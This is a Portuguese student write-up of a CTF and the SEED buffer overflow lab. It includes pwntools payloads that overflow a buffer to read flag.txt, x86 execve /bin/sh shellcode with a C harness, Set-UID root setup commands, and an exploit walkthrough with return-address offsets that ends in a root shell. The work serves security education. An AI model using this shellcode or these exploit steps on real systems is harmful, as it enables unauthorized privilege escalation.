# CTF 5 #

**Desafio 1** 
Neste desafio, para ler o conteúdo do ficheiro **flag.txt**, onde se encontra a flag que devemos submeter, é necessário alterar o ficheiro **exploit-example.py**, que é fornecido pela plataforma. Uma vez que o buffer de leitura tem tamanho 20, mas o scanf lê uma string de 28 caracteres, podemos aproveitar essa vulnerabilidade, iniciando um ataque de buffer overflow. Para isso devemos, no ficheiro de exploit alterar a linha `r.sendline(b"Tentar nao custa")` para `r.sendline(b"a"*20 + b"flag.txt")`. Com esta alteração, quando corrermos o comando `python3 exploit-example.py` para interagir com o servidor, o exploit vai enviar para o servidor uma string com 20 caracteres "a", seguido do nome do ficheiro que queremos ler. Desta forma, vamos provocar um buffer overflow e o conteúdo do ficheiro será escrito no stdout.

**Desafio 2**
Este desafio é semelhante ao anterior. A diferença está na condição `if(*(long*)val == 0xfefc2122)` que foi adicionada, que faz com que só seja possível executar o código que faz a leitura do ficheiro, se o endereço corresponder àquele que é indicado na condição. Sendo assim, temos de alterar a mesma linha do ficheiro de exploit, mas desta vez temos de acrescentar o endereço que é indicado na condição, trocando a sua ordem: `r.sendline(b"a"*20 + b"\x22\x21\xfc\xfe" + b"flag.txt")`.
Desta forma, quando interagirmos com o servidor, enviando esta string, será provocado um buffer overflow e o conteúdo do ficheiro será escrito no stdout.

# Tarefas da Semana #5 #
# Buffer Overflow

**Buffer Overflow** é definido como uma condição na qual um programa tenta escrever dados para além dos limites pré-alocados pelo buffer, que tem um comprimento fixo. Nesta atividade, explorar-se-á de que forma é que esta vulnerabilidade pode ser explorada por um utilizador malicioso para alterar o fluxo do programa, ou até mesmo para executar código por ele escrito.

# Tarefa 1 : Familiarizando-se com Shellcode

Antes de iniciar o ataque, é necessário um Shellcode. Um Shellcode é um pedaço de código que abre uma shell. 

Em C, o código seria este: 
```c
#include<stdio.h>

int main()
{
    char *name[2];

    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```
Contudo, não é possível compilar este código e usar o código binário como Shellcode. A melhor maneira de o fazer é escrevendo o Shellcode em código Assembly, e gerar o código binário a partir desse código.
```c
const char shellcode[] =
#if __x86_64__
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
    char code[500];
    strcpy(code, shellcode); // Copy the shellcode to the stack
    int (*func)() = (int(*)())code;
    func(); // Invoke the shellcode from the stack
    return 1;
}
```
O código acima inclui duas cópias do shellcode, uma para 32-bit e uma para 64-bit.

Depois de compilar e correr o programa, o programa invoca uma shell: 

```shell
[11/30/21]seed@VM:~/shellcode$ make
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
[11/30/21]seed@VM:~/shellcode$ ./a32.out 
$                                                                              
[11/30/21]seed@VM:~/shellcode$ ./a64.out 
$                                                                            
[11/30/21]seed@VM:~/shellcode
```


# Tarefa 2 : Compreendendo o Programa Vulnerável
O programa a ser usado contém uma vulnerabilidade buffer-overflow. Tentar-se-á explorar esta vulnerabilidade e ganhar privilégios root.

Depois de compilar o programa com a StackGuard e outras proteçoes da stack desligadas, torna-se o programa num programa do tipo Set-UID com privelégios root, usando os seguintes comandos:
```shell
sudo chown root stack 
sudo chmod 4755 stack 
```
O makefile disponível trata de alterar as permissões e desligar as proteçoes, e, o programa é compilado, escrevendo o comando `make`

# Tarefa 3 : Lançar um Ataque num Programa 32-bit (Nível 1)
Depos de se ter compilado e alterarado as permissões do programa vulnerável, está na altura de pôr em prática o ataque.

Contudo, primeiro é necessário saber a distância de memória entre a posição de começo do buffer e o lugar onde o endereço de retorno é guardado. Para tal, usar-se-á um método de _debugging_(depuração), do qual se obtém a seguinte informação, com a ajuda de _breakpoints_.
```
$ebp = 0xffffca98               -> Valor de ebp 
&buffer = 0xffffca2c            -> Endereço de começo do buffer
```

1. Em cima verifica-se que o frame pointer é `0xffffca98`, e, sendo asssim, o endereço de retorno tem que estar guardado em `ebp + 4` e o primeiro endereço para o qual se pode 'saltar' é `ebp + 8`. 
2. A diferença entre `ebp` e o começo do buffer é dada por: `$ebp - &buffer = 0xffffca98 - 0xffffca2c = 108` e assim a distância entre o endereço de retorno e o começo do buffer é dada por `108+4=112` pois o endereço de retorno se encontra 4 bytes do valor para o qual `ebp`aponta.

Assim, os valores que foram adicionados ao ficheiro [exploit.py](https://git.fe.up.pt/fsi/fsi2122/l04g02/-/blob/main/Week%205/exploit.py) , para além do código que abre um shellcode (copiado da tarefa 1) foram:

- `start = 517 - len(shellcode)`: o que é equivalente a tamanho(payload) - tamanho(shellcode), uma vez que se quer colocar o shellcode o mais para o fim da payload possível.
- `ret = 0xffffca2c + 200` : uma vez que o _gdb_ adiciona alguns dados de ambiente na stack antes de corre o programa depurado, quando o programa corre diretamente sem o uso do _gdb_, a stack não possui esses dados, e o frame pointer será maior do que o obtido através da depuração. Assim, vai-se adicionado ao edp, além dos 4 bytes mencionados em (1), um número arbitrário de bytes até ter sucesso.
- `offset = 112` : Explicado em (2)

Em baixo verifica-se que, de facto, o exploit abriu uma shell do tipo root.

```shell
[12/02/21]seed@VM:~/.../code$ python3 exploit.py 
[12/02/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# id                                                                 
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm)....
#   
```





